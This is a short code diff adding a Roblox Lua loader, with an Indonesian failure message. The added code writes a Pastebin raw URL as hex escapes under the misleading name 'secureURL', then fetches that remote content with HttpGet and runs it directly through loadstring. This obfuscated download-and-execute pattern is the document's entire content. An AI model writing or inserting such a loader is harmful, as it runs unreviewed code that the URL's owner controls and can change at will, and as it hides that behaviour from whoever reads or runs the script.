@@ -1,0 +1,8 @@
+local success, errorMessage = pcall(function()
+    local secureURL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x61\x73\x74\x65\x62\x69\x6e\x2e\x63\x6f\x6d\x2f\x72\x61\x77\x2f\x47\x32\x41\x71\x41\x35\x59\x74"
+    loadstring(game:HttpGet(secureURL))()
+end)
+
+if not success then
+    warn("Gagal memuat script. Silakan coba lagi nanti.")
+end
